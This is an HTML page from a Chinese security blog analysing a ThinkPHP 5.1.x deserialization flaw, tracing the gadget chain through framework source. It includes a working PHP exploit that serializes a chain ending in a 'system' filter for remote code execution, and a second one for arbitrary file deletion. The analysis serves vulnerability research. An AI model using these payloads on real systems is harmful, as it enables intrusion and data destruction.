@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="环境准备Thinkphp 5.1.38 写入反序列化点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP v5.1.x 反序列化 分析">
+<meta property="og:url" content="http://example.com/2022/01/04/ThinkPHP%20v5.1.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="环境准备Thinkphp 5.1.38 写入反序列化点">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9876ebb1f8844c99ab1de920d8414e48.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/27f43abaa6ca4eaf9d098c43f54788a5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b1c625471f7541c1a38e620d6fb29683.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/98ceaa7dfeb54ffbab1615d2949a67e9.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d999e5e41193423888bfa56af42deeaf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d006c0c3c88846a0aaf73ade99cc6304.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_18,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/eca90d6f93294d639fb1069d43b1b6fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/92e9511eee714f9bbc41f9a7e34a6810.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6f7a91fce5314f34a0b5ff1f6fafe4d2.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/dd8543ff440c4509acf9a5278e97459a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/151127c627e3426189a3835370452b5a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/69825bf3032d48fb83afaa19be5cc2d4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b6c382cb9f5e46c5b3ffcc5c5c11200f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0060dd1347a74ae08e5bba240ce332a3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/610def2a94a5466c8945abdedc8308b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_13,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/585147d65d0e4b5aa0f91830894666c7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/521e7e42c82046bea6cc2f52c84c7962.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5dc6f1abc5a44265bbae56eb92bbe555.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d8abf1ed6bf7425fa89feb2b89aba5f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/13b31e34c8de4b9ba29077ce3a2f5cb8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7cffa166026a42eda95251b2ed3c7753.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f35f4653edcb44989e9eee826a3344b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f9f11e9acee5485db5a38508f142c733.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e9ce2a4177454821a59185d5c3d03c19.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d03ec49af3634e1290cda711d406e764.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="article:published_time" content="2022-01-03T16:20:59.359Z">
+<meta property="article:modified_time" content="2022-01-03T16:20:46.416Z">
+<meta property="article:author" content="Y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/9876ebb1f8844c99ab1de920d8414e48.png#pic_center">
+
+<link rel="canonical" href="http://example.com/2022/01/04/ThinkPHP%20v5.1.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ThinkPHP v5.1.x 反序列化 分析 | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">17</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">123</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/ThinkPHP%20v5.1.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP v5.1.x 反序列化 分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-04 00:20:59 / 修改时间：00:20:46" itemprop="dateCreated datePublished" datetime="2022-01-04T00:20:59+08:00">2022-01-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ThinkPHP%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" itemprop="url" rel="index"><span itemprop="name">ThinkPHP漏洞集合</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>Thinkphp 5.1.38</p>
+<p>写入反序列化点</p>
+<p><img src="https://img-blog.csdnimg.cn/9876ebb1f8844c99ab1de920d8414e48.png#pic_center"></p>
+<a id="more"></a>
+
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append &#x3D; [];</span><br><span class="line">    private $data &#x3D; [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;append &#x3D; [&quot;Y0ng&quot;&#x3D;&gt;[]];</span><br><span class="line">        $this-&gt;data &#x3D; [&quot;Y0ng&quot;&#x3D;&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Request&#123;</span><br><span class="line">    protected $filter;</span><br><span class="line">    protected $hook &#x3D; [];</span><br><span class="line">    protected $config &#x3D; [</span><br><span class="line">        &#x2F;&#x2F; 表单ajax伪装变量</span><br><span class="line">        &#39;var_ajax&#39;         &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        </span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;filter &#x3D; &#39;system&#39;;</span><br><span class="line">        $this-&gt;hook &#x3D; [&#39;visible&#39;&#x3D;&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\Pivot;</span><br><span class="line">use think\Process;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files &#x3D; [new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new Windows()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>get任意传参</p>
+<p><img src="https://img-blog.csdnimg.cn/27f43abaa6ca4eaf9d098c43f54788a5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>以<code>__destruct为入口</code> 全局搜索</p>
+<p><img src="https://img-blog.csdnimg.cn/b1c625471f7541c1a38e620d6fb29683.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<blockquote>
+<p>thinkphp\library\think\process\pipes\Windows.php</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/98ceaa7dfeb54ffbab1615d2949a67e9.png#pic_center"></p>
+<p>两个函数</p>
+<p>close()进行关闭连接操作</p>
+<p><img src="https://img-blog.csdnimg.cn/d999e5e41193423888bfa56af42deeaf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>removefiles()</p>
+<p><img src="https://img-blog.csdnimg.cn/d006c0c3c88846a0aaf73ade99cc6304.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_18,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>可以任意文件删除 exp:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files &#x3D; [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files&#x3D;[&#39;0&#39;&#x3D;&gt;&#39;D:\phpstudy_pro\WWW\test.txt&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>用到了 <code>file_exists</code> 函数会将参数当作字符串来进行处理，可以用来<code>触发__toString</code></p>
+<p>全局搜索 __toString</p>
+<p><img src="https://img-blog.csdnimg.cn/eca90d6f93294d639fb1069d43b1b6fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<blockquote>
+<p>thinkphp\library\think\model\concern\Conversion.php</p>
+</blockquote>
+<blockquote>
+<p>trait Conversion</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/92e9511eee714f9bbc41f9a7e34a6810.png#pic_center"></p>
+<p>跟进toJson()</p>
+<p><img src="https://img-blog.csdnimg.cn/6f7a91fce5314f34a0b5ff1f6fafe4d2.png#pic_center"></p>
+<p>跟进toArray()</p>
+<p><img src="https://img-blog.csdnimg.cn/dd8543ff440c4509acf9a5278e97459a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>摘取部分代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 追加属性（必须定义获取器）</span><br><span class="line">        if (!empty($this-&gt;append)) &#123;</span><br><span class="line">            foreach ($this-&gt;append as $key &#x3D;&gt; $name) &#123;</span><br><span class="line">                if (is_array($name)) &#123;</span><br><span class="line">                    &#x2F;&#x2F; 追加关联对象属性</span><br><span class="line">                    $relation &#x3D; $this-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                    if (!$relation) &#123;</span><br><span class="line">                        $relation &#x3D; $this-&gt;getAttr($key);</span><br><span class="line">                        if ($relation) &#123;</span><br><span class="line">                            $relation-&gt;visible($name);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+<p>append 可控所以 key 与 name可控，relation是通过 <code>getRelation</code> 获得，跟进</p>
+<blockquote>
+<p>thinkphp\library\think\model\concern\RelationShip.php</p>
+</blockquote>
+<blockquote>
+<p>trait RelationShip</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/151127c627e3426189a3835370452b5a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>这里肯定 <code>要求返回空</code> 也就是if和elseif都不进入<br>接着 <code>进入getAttr</code></p>
+<blockquote>
+<p>thinkphp\library\think\model\concern\Attribute.php</p>
+</blockquote>
+<blockquote>
+<p>trait Attribute</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/69825bf3032d48fb83afaa19be5cc2d4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>返回值为 <code>return $value;</code></p>
+<p>跟进getData</p>
+<p><img src="https://img-blog.csdnimg.cn/b6c382cb9f5e46c5b3ffcc5c5c11200f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>因为上面 <code>三个都是trait</code>，全局搜索<code>找一个同时继承三个triat的子类</code></p>
+<blockquote>
+<p>thinkphp\library\think\Model.php<br>abstract class Model 抽象类</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/0060dd1347a74ae08e5bba240ce332a3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>先找一下实现类</p>
+<blockquote>
+<p>\thinkphp\library\think\model\Pivot.php</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/610def2a94a5466c8945abdedc8308b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_13,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>回到 <code>$relation-&gt;visible([$attr]);</code></p>
+<p>利用有两条路走</p>
+<ol>
+<li>   visible方法中存在利用</li>
+<li>   触发__call方法</li>
+</ol>
+<p>全局寻找visible方法，三处无利用点，尝试寻找_call方法</p>
+<blockquote>
+<p>thinkphp\library\think\Request.php</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/585147d65d0e4b5aa0f91830894666c7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><code>$this-&gt;hook[$method]</code> 可控 <code>$args</code> 可控</p>
+<p>但是存在</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array_unshift($args, $this);</span><br></pre></td></tr></table></figure>
+<p>本来 $args 作为命令参数可控，由于 <code>array_unshift()向数组插入新元素时会将新数组的值将被插入到数组的开头</code>，导致参数不可控</p>
+<p>那么尝试再去<code>调用其他方法 且参数可控</code></p>
+<blockquote>
+<p>在Thinkphp的Request类中还有一个filter功能，事实上Thinkphp多个RCE都与这个功能有关。我们可以尝试覆盖filter的方法去执行代码</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/521e7e42c82046bea6cc2f52c84c7962.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>利用点肯定是这里</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$value &#x3D; call_user_func($filter, $value);</span><br></pre></td></tr></table></figure>
+<p>但是两个参数都不可控，就去<code>向上找谁调用了filterValue</code> 看看能不能控制传入filterValue的参数</p>
+<p>找到这个类的input方法：</p>
+<p><img src="https://img-blog.csdnimg.cn/5dc6f1abc5a44265bbae56eb92bbe555.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>$data依旧不可控，继续往上寻找调用input的函数,找到 <code>param</code></p>
+<p><img src="https://img-blog.csdnimg.cn/d8abf1ed6bf7425fa89feb2b89aba5f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>$name依旧不可控，接着往上寻找isAjax()</p>
+<p>$this-&gt;config[‘var_ajax’] 可控</p>
+<p><img src="https://img-blog.csdnimg.cn/13b31e34c8de4b9ba29077ce3a2f5cb8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>在 <code>isAjax</code> 函数中，我们可以控制<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，意味着 <code>param</code> 函数中的<code>$name</code> 可控。param函数中的 <code>$name</code>可控就意味着 <code>input函数中的 $name</code> 可控。</p>
+<p>倒着梳理一下<br>在 <code>input中$this-&gt;param</code> 是通过与 <code>get传参进来的参数进行合并 传入input中的$data</code></p>
+<p><img src="https://img-blog.csdnimg.cn/7cffa166026a42eda95251b2ed3c7753.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>再看input中的这三句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$data &#x3D; $this-&gt;getData($data, $name);</span><br><span class="line">$filter &#x3D; $this-&gt;getFilter($filter, $default);</span><br><span class="line">$this-&gt;filterValue($data, $name, $filter);</span><br></pre></td></tr></table></figure>
+
+<p><strong>$data = $this-&gt;getData($data, $name)</strong><br>$name就是<code>$this-&gt;config[&#39;var_ajax&#39;]</code> 即 $data=$data[$name]</p>
+<p><img src="https://img-blog.csdnimg.cn/f35f4653edcb44989e9eee826a3344b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><strong>$filter = $this-&gt;getFilter($filter, $default)</strong></p>
+<p><code>$filter=&#39;&#39;</code> 进入else分支 返回$this-&gt;filter也就是可控的</p>
+<p><img src="https://img-blog.csdnimg.cn/f9f11e9acee5485db5a38508f142c733.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><strong>$this-&gt;filterValue($data, $name, $filter)</strong></p>
+<p>$data可控 $filter 可控 成功rce</p>
+<p><img src="https://img-blog.csdnimg.cn/e9ce2a4177454821a59185d5c3d03c19.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<h1 id="大概流程"><a href="#大概流程" class="headerlink" title="大概流程"></a>大概流程</h1><p><img src="https://img-blog.csdnimg.cn/d03ec49af3634e1290cda711d406e764.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/03/SCTF2021%20web/" rel="prev" title="SCTF2021 web">
+      <i class="fa fa-chevron-left"></i> SCTF2021 web
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
